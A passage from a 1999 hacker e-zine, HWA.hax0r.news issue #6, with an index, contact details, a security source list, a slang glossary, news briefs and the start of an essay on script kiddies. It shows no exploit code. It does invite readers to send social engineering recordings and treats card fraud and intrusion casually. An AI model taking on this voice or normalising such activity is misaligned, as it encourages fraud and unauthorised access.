@@ -1,0 +1,4011 @@
+    [ 28 63 29 20 31 39 39 39 20 63 72 75 63 69 70 68 75 78 20 68 77 61 ]
+  =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=
+  ==========================================================================
+  =                     <=-[ HWA.hax0r.news ]-=>                           =
+  ==========================================================================
+    [=HWA'99=]                         Number 6 Volume 1 1999 Feb 13/14th 99
+  ==========================================================================
+
+  
+   "You know its going to be one of those days when you wake up at 4am and
+    go into #insomniacs for some company but everyone else is asleep..." 
+                                        
+                                                         - VeXxation
+  
+   Synopsis
+   --------     
+   
+   The purpose of this newsletter is to 'digest' current events of interest
+   that affect the online underground and netizens in general. This includes
+   coverage of general security issues, hacks, exploits, underground news
+   and anything else I think is worthy of a look see.
+
+    This list is NOT meant as a replacement for, nor to compete with, the
+   likes of publications such as CuD or PHRACK or with news sites such as
+   AntiOnline, the Hacker News Network (HNN) or mailing lists such as
+   BUGTRAQ or ISN nor could any other 'digest' of this type do so.
+
+    It *is* intended  however, to  compliment such material and provide a
+   reference to those who follow the culture by keeping tabs on as many
+   sources as possible and providing links to further info, its a labour
+   of love and will be continued for as long as I feel like it, i'm not
+   motivated by dollars or the illusion of fame, did you ever notice how
+   the most famous/infamous hackers are the ones that get caught? there's
+   a lot to be said for remaining just outside the circle... <g>
+
+
+   @HWA
+   
+   ------------------------------------------------------------------------- 
+  
+                     Welcome to HWA.hax0r.news ... #6
+                     
+                         S P E C I A L  I S S U E                            
+                         
+                 tHe |<rAd sT. vA13nt1n3s DaY m4554cr3 1s5u3 
+                 
+                 
+   "...F.V? (Fantasy Violence) what about R.V? (Real Violence),  there are kids
+   shooting each other on the streets abd congress is worrying about the
+   coyote dropping an anvil on the roadrunner" 
+                                                - FProphet'99              
+                     
+   ------------------------------------------------------------------------- 
+   
+  Issue #6 middle release, Feb 13th 1999                Yes you SHOULD worry.
+  
+   ------------------------------------------------------------------------- 
+  
+  'imapd THIS muthafuckaz' 
+
+  _____/[ INDEX ]\___________________________________________________________         
+
+    Key     Content
+  ---------------------------------------------------------------------------    
+  
+    0.0  .. COPYRIGHTS 
+    0.1  .. CONTACT INFORMATION & SNAIL MAIL DROP ETC
+    0.2  .. SOURCES        
+    0.3  .. THIS IS WHO WE ARE
+    0.4  .. WHAT'S IN A NAME? why `HWA.hax0r.news'?
+    0.5  .. THE HWA_FAQ V1.0 
+    
+ ----------------------------------------------------------------------------    
+    
+    1.0  .. Greets
+    1.1  .. Last minute stuff, rumours, newsbytes, mailbag
+    2.0  .. From the editor
+    3.0  .. The Future of Hacking by pH4RcYd3
+    3.1  .. Angelfire Flaws by pH4RcYd3
+    3.2  .. Some underground prose from Liquid Phire
+    4.0  .. Intercepted log from a private LoU irc conference courtesy of Ruffneck    
+    5.0  .. Microsoft security advisories
+    5.1  .. Sun security advisories
+    5.2  .. eYE security advisories
+    6.0  .. Arbitrary command execution using Pine
+    7.0  .. Hacking in Germany by Qubik
+    8.0  .. Spotlight on: Project Gamma by Qubik
+    9.0  .. Secret Cyber Sex; Gary, your secret is out!
+   10.0  .. So is Mr Lewis's Kidney! 
+   11.0  .. Free Email acct's full of security holes?
+   12.0  .. Quebec government's hacker challenge 
+   13.0  .. News from Tokyo from Wile
+      
+    A.0  .. APPENDICES  
+    A.1  .. PHACVW linx and references 
+
+  ---------------------------------------------------------------------------
+  
+      The name Linus means "flaxen-haired" and is of Greek origin ...- Ed
+      
+      
+       "Shouting the loudest does not make you right or true" - FP
+ 
+  ---------------------------------------------------------------------------      
+
+     @HWA'99                 
+     
+     
+  
+         
+  0.0  (C) COPYRIGHT, (K)OPYWRONG, COPYLEFT? V2.0
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     
+     THE OPINIONS OF THE WRITERS DO NOT NECESSARILY REFLECT THE
+     OPINIONS OF THE PUBLISHERS AND VICE VERSA IN FACT WE DUNNO
+     WTF IS GONNA TAKE RESPONSIBILITY FOR THIS, I'M NOT DOING IT
+     (LOTS OF ME EITHER'S RESOUND IN THE BACKGROUND) SO UHM JUST
+     READ IT AND IF IT BUGS YOU WELL TFS (SEE FAQ).
+     
+     Important semi-legalese and license to redistribute:
+     
+     YOU MAY DISTRIBUTE THIS ZINE WITHOUT PERMISSION FROM MYSELF 
+     AND ARE GRANTED THE RIGHT TO QUOTE ME OR THE CONTENTS OF THE
+     ZINE SO LONG AS Cruciphux AND/OR HWA.hax0r.news ARE MENTIONED 
+     IN YOUR WRITING. LINK'S ARE NOT NECESSARY OR EXPECTED BUT ARE 
+     APPRECIATED the current link is http://welcome.to/HWA.hax0r.news
+     IT IS NOT MY INTENTION TO VIOLATE ANYONE'S COPYRIGHTS OR BREAK
+     ANY NETIQUETTE IN ANY WAY IF YOU FEEL I'VE DONE THAT PLEASE EMAIL
+     ME PRIVATELY current email cruciphux@dok.org 
+     
+     THIS DOES NOT CONSTITUTE ANY LEGAL RIGHTS, IN THIS COUNTRY ALL
+     WORKS ARE (C) AS SOON AS COMMITTED TO PAPER OR DISK, IF ORIGINAL
+     THE LAYOUT AND COMMENTARIES ARE THEREFORE (C) WHICH MEANS:
+     
+     I RETAIN ALL RIGHTS, BUT I GIVE YOU THE RIGHT TO READ, QUOTE
+     AND REDISTRIBUTE/MIRROR. - EoD
+   
+    
+     Although this file and all future issues are now copyright, some of
+    the content holds its  own copyright and these are printed and 
+    respected. News is news so i'll print any and all news but will quote 
+    sources when the source is known, if its good enough for CNN its good
+    enough for me. And i'm doing it for free on my own time so pfffft. :) 
+    
+    No monies are made or sought through the distribution of this material.
+    If you have a problem or concern email me and we'll discuss it.
+    
+    cruciphux@dok.org
+    
+    Cruciphux [C*:.]
+
+      
+     
+  0.1  CONTACT INFORMATION AND MAIL DROP
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       
+       Has it occurred to anybody that "AOL for Dummies" is an extremely
+       redundant name for a book? 
+                                      - unknown
+       
+           
+     Wahoo, we now have a mail-drop, if you are outside of the U.S.A or 
+    Canada / North America (hell even if you are inside ..) and wish to
+    send printed matter like newspaper clippings a subscription to your
+    cool foreign hacking zine or photos, small non-explosive packages
+    or sensitive information etc etc well, now you can. (w00t) please
+    no more inflatable sheep or plastic dog droppings, or fake vomit
+    thanks.
+    
+    Send all goodies to:
+    
+	    HWA NEWS
+	    P.O BOX 44118
+	    370 MAIN ST. NORTH
+	    BRAMPTON, ONTARIO
+	    CANADA
+	    L6V 4H5
+	    
+    Ideas for interesting 'stuff' to send in apart from news:
+    
+    - Photo copies of old system manual front pages (optionally signed by you) ;-)
+    - Photos of yourself, your mom, sister, dog and or cat in a NON
+      compromising position plz I don't want pr0n. <g>
+    - Picture postcards
+    - CD's 3.5" disks, Zip disks, 5.25" or 8" floppies, Qic40/80/100-250
+      tapes with hack/security related archives, logs, irc logs etc on em.
+    - audio or video cassettes of yourself/others etc of interesting phone
+      fun or social engineering examples or transcripts thereof.
+    
+    If you still can't think of anything you're probably not that interesting
+    a person after all so don't worry about it <BeG>  
+    
+    Our current email:
+    
+    Submissions/zine gossip.....: hwa@press.usmc.net
+    Private email to editor.....: cruciphux@dok.org
+    Distribution/Website........: sas72@usa.net
+
+    @HWA
+
+           
+    
+  0.2  Sources ***
+       ~~~~~~~~~~~     
+
+     Sources can be some, all, or none of the following (by no means complete
+    nor listed in any degree of importance) Unless otherwise noted, like msgs
+    from lists or news from other sites, articles and information is compiled
+    and or sourced by Cruciphux no copyright claimed.
+
+    HiR:Hackers Information Report... http://axon.jccc.net/hir/
+    News & I/O zine ................. http://www.antionline.com/
+   *News/Hacker site................. http://www.bikkel.com/~demoniz/ *DOWN!*
+    News (New site unconfirmed).......http://cnewz98.hypermart.net/
+    Back Orifice/cDc..................http://www.cultdeadcow.com/
+    News site (HNN) .....,............http://www.hackernews.com/
+    Help Net Security.................http://net-security.org/  
+    News,Advisories,++ ...............http://www.l0pht.com/
+    NewsTrolls (HNN)..................http://www.newstrolls.com/
+    News + Exploit archive ...........http://www.rootshell.com/beta/news.html
+    CuD ..............................http://www.soci.niu.edu/~cudigest
+    News site+........................http://www.zdnet.com/
+
+    +Various mailing lists and some newsgroups, such as ...
+    +other sites available on the HNN affiliates page, please see
+     http://www.hackernews.com/affiliates.html as they seem to be popping up
+     rather frequently ...
+
+    * Yes demoniz is now officially retired, if you go to that site though the
+     Bikkel web board (as of this writing) is STILL ACTIVE, www.hwa-iwa.org will
+     also be hosting a webboard as soon as that site comes online perhaps you can
+     visit it and check us out if I can get some decent wwwboard code running I
+     don't really want to write my own, another alternative being considered is a
+     telnet bbs that will be semi-open to all, you will be kept posted. - cruciphux
+    
+    http://www.the-project.org/ .. IRC list/admin archives
+    http://www.anchordesk.com/  .. Jesse Berst's AnchorDesk
+    
+    alt.hackers.malicious
+    alt.hackers
+    alt.2600
+    BUGTRAQ
+    ISN security mailing list
+    ntbugtraq
+    <+others>
+
+    NEWS Agencies, News search engines etc:
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    http://www.cnn.com/SEARCH/
+    http://www.foxnews.com/search/cgi-bin/search.cgi?query=cracker&days=0&wires=0&startwire=0
+    http://www.news.com/Searching/Results/1,18,1,00.html?querystr=cracker
+    http://www.ottawacitizen.com/business/
+    http://search.yahoo.com.sg/search/news_sg?p=cracker
+    http://www.washingtonpost.com/cgi-bin/search?DB_NAME=WPlate&TOTAL_HITLIST=20&DEFAULT_OPERATOR=AND&headline=&WITHIN_FIELD_NAME=.lt.event_date&WITHIN_DAYS=0&description=cracker
+    http://www.zdnet.com/zdtv/cybercrime/
+    http://www.zdnet.com/zdtv/cybercrime/chaostheory/ (Kevin Poulsen's Column)
+
+    NOTE: See appendices for details on other links.
+    
+    Referenced news links
+    ~~~~~~~~~~~~~~~~~~~~~
+       
+    http://news.bbc.co.uk/hi/english/sci/tech/newsid_254000/254236.stm
+    http://freespeech.org/eua/ Electronic Underground Affiliation
+    http://www.l0pht.com/cyberul.html     
+    http://www.hackernews.com/archive.html?122998.html
+    http://ech0.cjb.net ech0 Security
+    http://net-security.org Net Security  
+
+    ...
+    
+    
+    Submissions/Hints/Tips/Etc
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~
+    All submissions that are `published' are printed with the credits
+    you provide, if no response is received by a week or two it is assumed
+    that you don't care wether the article/email is to be used in an issue
+    or not and may be used at my discretion.
+    
+    Looking for:
+    
+    Good news sites that are not already listed here OR on the HNN affiliates
+    page at http://www.hackernews.com/affiliates.html
+    
+    Magazines (complete or just the articles) of breaking sekurity or hacker
+    activity in your region, this includes telephone phraud and any other
+    technological use, abuse hole or cool thingy. ;-) cut em out and send it
+    to the drop box.
+    
+    
+    - Ed
+    
+    Mailing List Subscription Info   (Far from complete)         Feb 1999
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   ~~~~~~~~~~~~~~~~~~~         ~~~~~~~~	
+        
+    ISS Security mailing list faq : http://www.iss.net/iss/maillist.html
+    
+    
+    THE MOST READ:
+    
+    BUGTRAQ - Subscription info
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    
+    What is Bugtraq?     
+
+    Bugtraq is a full-disclosure UNIX security mailing list, (see the info
+    file) started by Scott Chasin <chasin@crimelab.com>. To subscribe to 
+    bugtraq, send mail to listserv@netspace.org containing the message body
+    subscribe bugtraq. I've been archiving this list on the web since late 
+    1993. It is searchable with glimpse and archived on-the-fly with hypermail.
+    
+    Searchable Hypermail Index;
+         
+          http://www.eecs.nwu.edu/~jmyers/bugtraq/index.html
+    
+    
+        
+    About the Bugtraq mailing list
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    
+    The following comes from Bugtraq's info file: 
+
+    This list is for *detailed* discussion of UNIX security holes: what they are,
+    how to exploit, and what to do to fix them. 
+
+    This list is not intended to be about cracking systems or exploiting their 
+    vulnerabilities. It is about defining, recognizing, and preventing use of 
+    security holes and risks. 
+
+    Please refrain from posting one-line messages or messages that do not contain
+    any substance that can relate to this list`s charter. 
+
+    I will allow certain informational posts regarding updates to security tools,
+    documents, etc. But I will not tolerate any unnecessary or nonessential "noise"
+    on this list. 
+
+    Please follow the below guidelines on what kind of information should be posted
+    to the Bugtraq list: 
+
+    + Information on Unix related security holes/backdoors (past and present) 
+    + Exploit programs, scripts or detailed processes about the above 
+    + Patches, workarounds, fixes 
+    + Announcements, advisories or warnings 
+    + Ideas, future plans or current works dealing with Unix security 
+    + Information material regarding vendor contacts and procedures 
+    + Individual experiences in dealing with above vendors or security organizations 
+    + Incident advisories or informational reporting 
+
+    Any non-essential replies should not be directed to the list but to the originator of the message. Please do not "CC" the bugtraq
+    reflector address if the response does not meet the above criteria. 
+
+    Remember: YOYOW. 
+
+    You own your own words. This means that you are responsible for the words that you post on this list and that reproduction of
+    those words without your permission in any medium outside the distribution of this list may be challenged by you, the author. 
+
+    For questions or comments, please mail me: 
+    chasin@crimelab.com (Scott Chasin) 
+
+    
+    BEST-OF-SECURITY Subscription Info.
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+           
+    
+                    _/_/_/          _/_/          _/_/_/
+                   _/    _/      _/    _/      _/
+                  _/_/_/        _/    _/        _/_/
+                 _/    _/      _/    _/            _/
+                _/_/_/          _/_/        _/_/_/
+
+                Best            Of          Security
+
+    "echo subscribe|mail best-of-security-request@suburbia.net"
+
+                                or
+
+    "echo subscribe|mail best-of-security-request-d@suburbia.net"
+
+                          (weekly digest)
+
+    For those of you that just don't get the above, try sending a message to
+    best-of-security-request@suburbia.net with a subject and body of subscribe
+    and you will get added to the list (maybe, if the admin likes your email).  
+
+
+    @HWA
+    
+     
+  0.3  THIS IS WHO WE ARE 
+       ~~~~~~~~~~~~~~~~~~
+      
+      'A "thug" was once the name for a ritual strangler, and is taken from
+       the Hindu word Thag... ' - Ed
+      
+      
+      Some HWA members and Legacy staff
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    
+      scruciphux@dok.org.......... currently active/editorial
+      darkshadez@ThePentagon.com: currently active/man in black
+      fprophet@dok.org..........: currently active/IRC+ man in black
+      sas72@usa.net ............. currently active/IRC+ distribution
+      
+      
+      
+      And an HWA member doing the job of proof reading:
+      
+      vexxation@usa.net ........: currently active/IRC+ proof reading
+      
+      
+      Foreign Correspondants/affiliate members
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+      ATTENTION: All foreign correspondants please check in or be removed by next
+      issue  I need  your current emails since contact info was recently lost in a 
+      HD mishap and i'm not carrying any deadweight. Plus we need more people sending
+      in info, my apologies for not getting back to you if you sent in January I lost
+      it, please resend. 
+      
+      
+               
+       N0Portz ..........................: Australia      
+       Qubik ............................: United Kingdom 
+       system error .....................: Indonesia      
+       Wile (wile coyote) ...............: Japan/the East 
+       Ruffneck  ........................: Netherlands/Holland
+       
+       And unofficially yet contributing too much to ignore ;)
+       
+       Spikeman .........................: World media 
+       
+       Please send in your sites for inclusion here if you haven't already
+       also if you want your emails listed send me a note ... - Ed
+       
+      http://www.genocide2600.com/~spikeman/  .. Spikeman's DoS and protection site
+        
+       
+     Contributors to this issue:
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       liquid phire......................: underground prose
+       pH4RcYd3 .........................: The Future of Hacking+       
+       Qubik ............................: Hacking in Germany+     
+       Ruffneck .........................: LoU irc log+
+       Spikeman .........................: daily news updates+       
+       Wile .............................: News from Tokyo
+       
+       
+       
+       
+    :-p  
+    
+    
+    1. We do NOT work for the government in any shape or form.
+     
+    2. Unchanged since issue #1,
+        
+    
+    @HWA
+    
+    
+
+  0.4  Whats in a name? why HWA.hax0r.news??
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     
+      Well what does HWA stand for? never mind if you ever find out I may
+     have to get those hax0rs from 'Hackers' or the Pretorians after you.
+     
+     In case you couldn't figure it out hax0r is "new skewl" and although
+     it is laughed at, shunned, or even pidgeon holed with those 'dumb
+     leet (l33t?) dewds' <see article in issue #4> this is the state
+     of affairs. It ain't Stephen Levy's HACKERS anymore. BTW to all you 
+     up  and comers, i'd highly recommend you get that book. Its almost 
+     like  buying a clue. Anyway..on with the show .. - Editorial staff
+     
+
+   
+
+  0.5  HWA FAQ v1.0 Feb 13th 1999 (Abridged & slightly updated)
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       
+    Also released in issue #3. (unchanged) check that issue for the faq
+    it won't be reprinted unless changed in a big way with the exception
+    of the following excerpt from the FAQ, included to assist first time
+    readers:
+
+    Some of the stuff related to personal useage and use in this zine are
+    listed below: Some are very useful, others attempt to deny the any possible
+    attempts at eschewing obfuscation by obsucuring their actual definitions.
+    
+    @HWA  - see EoA  ;-)
+    !=    - Mathematical notation "is not equal to" or "does not equal"
+            ASC(247)  "wavey equals" sign means "almost equal" to. If written
+            an =/= (equals sign with a slash thru it) also means !=, =< is Equal
+            to or less than and =>  is equal to or greater than (etc, this aint 
+            fucking grade school, cripes, don't believe I just typed all that..)      
+    AAM   - Ask a minor (someone under age of adulthood, usually <16, <18 or <21)
+   *AOL   - A great deal of people that got ripped off for net access by a huge
+            clueless isp with sekurity that you can drive buses through, we're
+            not talking Kung-Fu being none too good here, Buy-A-Kloo maybe at the
+            least they could try leasing one??
+    CC    - Credit Card phraud
+    CCC   - Chaos Computer Club (Germany)               
+    EoC   - End of Commentary
+    EoA   - End of Article or more commonly @HWA
+    EoF   - End of file
+    EoD   - End of diatribe (AOL'ers: look it up)
+    FUD   - Coined by Unknown and made famous by HNN <g> - "Fear uncertainty and doubt",
+            usually in general media articles not high brow articles such as ours or other
+            HNN affiliates ;)
+    HNN   - Hacker News Network and its affiliates http://www.hackernews.com/affiliates.html       
+    NFC   - Depends on context: No Further Comment or No Fucking Comment
+    NFR   - Network Flight Recorder (Do a websearch)
+    PHACV - And variations of same <coff> 
+           Phreaking, Hacking, Anarchy, Cracking, Carding (CC) Groups Virus, Warfare
+          
+          Alternates: H - hacking, hacktivist
+                      C - Cracking <software>
+                      C - Cracking <systems hacking>
+                      V - Virus 
+                      W - Warfare <cyberwarfare usually as in Jihad>
+                      CT - Cyber Terrorism
+    TBC - To Be Continued also 2bc (usually followed by ellipses...) :^0
+    TBA - To Be Arranged/To Be Announced also 2ba
+    TFS - Tough fucking shit.
+    
+    
+        
+  1.0  Greets!?!?! yeah greets! w0w huh. - Ed
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     
+     Thanks to all in the community for their support and interest but i'd
+     like to see more reader input, help me out here, whats good, what sucks
+     etc, not that I guarantee i'll take any notice mind you, but send in 
+     your thoughts anyway.
+     
+     
+     Shouts to:
+
+       * Kevin Mitnick       * demoniz          * The l0pht crew
+       * tattooman           * Dicentra         * Pyra          
+       * Vexxation           * FProphet         * TwistedP      
+       * NeMstah             * the readers
+     
+       * all the people who sent in cool emails and support
+       * our new 'staff' members.
+     
+  
+     kewl sites:
+     
+     + http://www.freshmeat.net/
+     + http://www.slashdot.org/
+     + http://www.l0pht.com/
+     + http://www.2600.com/
+     + http://hacknews.bikkel.com/ (http://www.bikkel.com/~demoniz/)
+     + http://www.legions.org/
+     + http://www.genocide2600.com/      
+     + http://www.genocide2600.com/~spikeman/
+     + http://www.genocide2600.com/~tattooman/     
+     + http://www.hackernews.com/ (Went online same time we started issue 1!)          
+   
+     @HWA
+     
+
+  1.1  Last minute stuff, rumours and newsbytes
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       
+       "What is popular isn't always right, and what is right isn't
+         always popular..." 
+                           - FProphet '99
+
+    +++ When was the last time you backed up your important data?    
+    
+    ++  Check out http://c5.hakker.com/ kewl hostname, kewl host, i was bribed to
+        say this and its in German so I dunno if its great or not but check em
+        out anyways, webhosting, email forwarding etc etc ;) (Pages in German)
+    
+    ++  IS YOUR 'FREEMAIL' ACCOUNT FULL OF SECURITY HOLES?
+        Contributed by me, source: ZDNet news, see section 11 for the full article.
+        If you have an account on Hotmail, Yahoo!, or Excite, it's vulnerable to
+        hackers. Ira Winkler investigates the security risks of free e-mail services.
+
+        http://chkpt.zdnet.com/chkpt/zdnu99021301/www.zdnet.com/zdtv/cybercrime/spyfiles/story/0,3700,2205746,00.html
+    
+    ++ 15 YR OLD AND 18 YR OLD BUSTED FOR ATTEMPTED COMPUTER BREAKINS
+       (HNN/contributed by erehwon) Source: Washington Post
+     
+        Vienna Virginia police have arrested a 15 year old freshman for
+       breaking into the computers at Clemson University and
+       attempting to break into systems at NASA. The Vienna student
+       was arrested Feb. 1 on charges of felony computer trespass and
+       misdemeanor computer fraud. Authorities in South Carolina have
+       arrested Steven Ray McAlister, 18, of Pelzer, S.C., and charged
+       him with conspiracy to commit computer crime, naming the
+       Vienna youth as his co-conspirator.        
+    
+       http://search.washingtonpost.com/wp-srv/WPlate/1999-02/12/032l-021299-idx.html
+
+    ++ Dallas Semi Debuts Single-Chip Temperature Data Logger
+       Contributed to HWA by Spikeman Source: techweb
+       
+       DS1615 Temperature Recorder integrates a Y2K-compatible
+       real-time clock, digital thermometer, nonvolatile memory, control
+       logic, and serial interface.
+       http://www.techweb.com/wire/story/TWB19990211S0008
+
+
+    ++ Where's Waldo? Maybe On The Edge Of A Chip
+       Contributed to HWA by Spikeman Source: techweb
+       
+       Designers have been putting their initials on chips for years, but
+       finer geometries open the possibility of more sophisticated images,
+       such as cartoon characters.
+       http://www.techweb.com/wire/story/TWB19990211S0001
+
+
+    ++ AT&T CEO: Scrap Phone-Access Charges
+       Contributed to HWA by Spikeman Source: techweb
+       
+       Dumping access charges means an end to universal service, a
+       decades-long tradition of low-cost phone service to rural areas.
+       http://www.techweb.com/wire/story/TWB19990210S0016
+
+    ++ DOJ: Microsoft Feared Fair Competition
+       Contributed to HWA by Spikeman Source: techweb
+       
+       The government's lead attorney says Microsoft feared competing
+       with Netscape and relied on exclusionary contracts with ISPs.
+       http://www.techweb.com/wire/story/msftdoj/TWB19990210S0014
+
+
+
+    ++ Gateway Looks To Serve Networked Homes
+       Contributed to HWA by Spikeman Source: techweb
+       
+       Gateway is designing a server to serve the networked home of the
+       future.
+       http://www.techweb.com/wire/story/TWB19990210S0017
+
+    ++ MTV's Road Rules, a hacker haven?
+       Abe, some dork on Road Rules an MTV show was seen sporting an "official"
+       r00t hat... you mean just anyone can't make a hat with "r00t" on it? geez
+       anyway w00t to the r00t ... contributed by everyone and even discussed on
+       irc and dc-stuff ... (*sigh*) watch for the new HWA.hax0r.news t-shirts and
+       hats to come soon!!! =) (No offense to r00t intended, they rock harder than
+       MTV ever could - Ed ps. add me to the bots! ? whats the #Hack key? ;) <sic>
+
+    ++ Online Freedom Of Information Sparks Fears
+       Contributed to HWA by Spikeman Source: techweb
+       
+       Requirement to publish disaster information about nation's chemical
+       plants may be road map for terrorists, lawmakers say.
+       http://www.techweb.com/wire/story/TWB19990210S0015
+
+   
+     
+    ++ ONLINE PORN  VIGILANTE "A LIAR" (CULT. 9:20 am)    
+       Contributed to HWA by Spikeman Source: ZDNnet news
+         
+       http://www.wired.com/news/news/email/explode-infobeat/culture/story/17789.html
+       A former hacker made headlines all over the world when he declared war on
+       child pornographers. But his one-man campaign wasn't all it was cracked up
+       to be. By Steve Silberman.
+
+    ++ FREE PCS -- WITH A CATCH (BUS. 7:28 am)
+       Contributed to HWA by Spikeman Source: ZDNet news
+        
+       http://www.wired.com/news/news/email/explode-infobeat/business/story/17783.html
+       A California start-up is offering Compaq computers to the
+       first 10,000 people to sign away their consumer privacy.
+
+
+
+    ++ BT, MICROSOFT IN WIRELESS DEAL (BUS. 7:28 am)
+       Contributed to HWA by Spikeman Source: ZDNet news
+         
+       http://www.wired.com/news/news/email/explode-infobeat/business/story/17784.html
+
+       The two companies reach an agreement to develop Internet and
+       corporate data services for mobile users.       
+
+
+    ++ CHINESE DISSIDENT APPEALS (POL. 7:28 am)
+       Contributed to HWA by Spikeman Source: ZDNet news
+       
+       http://www.wired.com/news/news/email/explode-infobeat/politics/story/17785.html
+      
+       A software engineer is fighting the two-year sentence that a Shanghai
+       court gave him for providing email addresses to US-based publications.
+
+
+
+    ++ Early Y2K Suit Struck Down
+       Contributed to HWA by Spikeman Source: The Recorder
+        
+      " ...in California Intuit Inc. has won another round in the ongoing Y2K
+      litigation wars. A California judge has dismissed most of the case
+      against it in a combined class action suit, In re Intuit Inc. Year 2000
+      California Litigation. Plaintiffs had alleged that Intuit's Quicken
+      financial software is not Year 2000 compliant and that consumers had
+      already been damaged as a result. The judge threw out damages and fraud
+      claims, but said plaintiffs could amend their injunctive relief
+      complaint, which centers on the charge that Intuit engaged in unfair
+      business practices." (The Recorder) -- 
+      
+      For complete story, see;
+      
+      http://www.lawnewsnetwork.com/stories/feb/e020899k.html)
+        
+        
+        
+   ++ HACKER STEALS WOMAN'S PASSWORD, SENDS PORNO OFFER IN HER NAME - SF Gate 02/04/99
+      Contributed to HWA by Spikeman Source: SF Gate
+      
+      http://www.sfgate.com/cgi-bin/article.cgi?file=/news/archive/1999/02/04/state1338EST0026.DTL
+        
+      (02-04) 10:38 PST APTOS, Calif. (AP) -- A 70-year-old woman who used 
+      the Internet to learn about quilting and coins was targeted by a 
+      hacker who stole her password and used it to send 22,000 pornographic 
+      e-mails in her name.
+        
+      "Lucille Nordgren, a grandmother of five, thought America Online was a 
+       convenient way to follow her hobbies. She was still reeling on 
+       Thursday from the news her account was used to send electronic ads 
+       for a web site offering ``incest, fetishes, super young teens, wild 
+       orgies and bondage.''
+        
+        
+    ++ Web Site Won
+       Contributed to HWA by Spikeman
+        
+       The anti-abortion Web site the Nuremberg Files was thrown on the
+       defensive by last week's federal court jury verdict. Then, the site was
+       shut down Friday afternoon by its Internet service provider, MindSpring.
+       However, 54-year-old computer programmer Otis O'Neal "Neal" Horsley, is
+       searching for another ISP. The good news for Horsley is that the judge
+       in the Portland, Ore., case refused to grant an injunction closing down
+       the site. "If I go to jail over this, I take the First Amendment with
+       me," Horsley said. (Fulton County Daily Report -- For complete story,
+       see http://www.lawnewsnetwork.com/stories/feb/e020899h.html)
+        
+        
+    ++ Intel Trying to Oust FTC Lawyer
+       Contributed to HWA by Spikeman
+        
+      Intel is trying to bench the lead government counsel in the Federal
+      Trade Commission's antitrust case against the chip maker. Richard
+      Parker, deputy director of the agency's competition bureau and first
+      chair for the upcoming March 9 trial, is the subject of a motion to
+      disqualify. Intel filed the motion under seal last month. The company
+      declined to comment on its grounds for disqualifying Parker, but
+      Parker's former law firm, O'Melveny & Myers, represented Advanced Micro
+      Devices in its court battles with Intel in the early '90s, and former
+      O'Melveny partner Tom McCoy left the firm to become AMD's general
+      counsel. An FTC spokesperson said that it had cleared Parker's
+      involvement in the case with two ethics experts. (CNET News -- For
+      complete story, see
+      
+      http://www.news.com/News/Item/0,4,32148,00.html?st.ne.ni.lh)
+
+     
+     
+     Mucho thanks to Spikeman for directing his efforts to our cause of bringing
+     you the news you want to read about in a timely manner ... - Ed
+     
+     @HWA
+     
+     
+  2.0  From the editor.
+       ~~~~~~~~~~~~~~~~
+
+     #include <stdio.h>
+     #include <insight.h>
+     #include <backup.h>
+
+     main()
+     {
+      printf ("Read commented source!\n\n");
+      
+     /*             
+      *Ok kiddies we're pumping out some more stuff here as we steamroll into  
+      *issue #6 i'm wondering if we can really pull off a weekly release as
+      *hoped. I mean hopefully not too many people are getting caught and not
+      *too many sites (bah hahahaha yeah right) are being vandalized by the script
+      *kiddiez etc. Work continues on hwa-iwa.org which is running Debian Linux at
+      *this time, i'm playing around with some stuff there but don't bother port
+      *scanning etc u won't find anything interesting on that box unless you really
+      *want to snarf half written articles <grin> etc ... besides if you did break
+      *in i'd just end up writing a story about it so whats the point? *g* moving
+      *right along, thanks for the continued support everyone and tty next time...
+      */
+      printf ("EoF.\n");
+      }
+
+
+      www.hwa-iwa.org is now online but not ready for primetime yet, if you go
+      there you will just be presented with a link to the HWA.hax0r.news mirrors
+      the site is under major development and will be announced here when it goes
+      "online for primetime" with webboard and file archives etc etc, stay tuned
+      for more as it becomes available ie: as I get it done ... ;)
+      
+      Issue #6! ... w00t w00t w00t! ... 
+      
+      w00t! /`wu:t n & v w00ten /`wu:ten n & v Eng. Unk.
+        1. A transcursion or transcendance into joy from an otherwise inert state
+        2. Something Cruciphux can't go a day without typing on Efnet
+     
+      Congrats, thanks, articles, news submissions and kudos to us at the
+     main address: hwa@press.usmc.net complaints and all nastygrams and 
+     mailbombs can go to /dev/nul nukes, synfloods and papasmurfs to 
+     127.0.0.1, private mail to cruciphux@dok.org
+
+     danke.
+
+     C*:.
+
+
+     @HWA
+     
+     
+         
+                    
+  3.0 The Future of Hacking by pH4RcYd3
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+            
+      -------------------------
+       The Future of Hacking
+      =========================
+             
+      by pH4RcYd3!pDX
+      [ pArAd0x ]
+      
+      pH4RcYd3@hotmail.com
+        
+
+        The future of Hacking some people do not think about...But as I was
+      browsing CyberArmy.com's WWWBoard for some interesting conversations I
+      was bombarded by messages saying "Anyone have a Win98 Spoofer" and "How
+      do you find out someone's IP number in AOL" and such things like that. 
+      
+       These tell me one thing about a  person...LAMER! These people do not
+      know any other OS except Winblowz and like to nuke and punt people for 
+      whatever immature reason. They like to send out virii and scerew up 
+      someone's computer for no absolute reason. If I ever met one of these 
+      people in person you know what I would see? I would see a 13 yr. old boy
+      (or girl) cowering behind his WinNuke walking around a computer store 
+      asking people if they memorized there IP number and if they did, can they
+      give it to him. Now I realize that i'm generalizing packet warriors at 
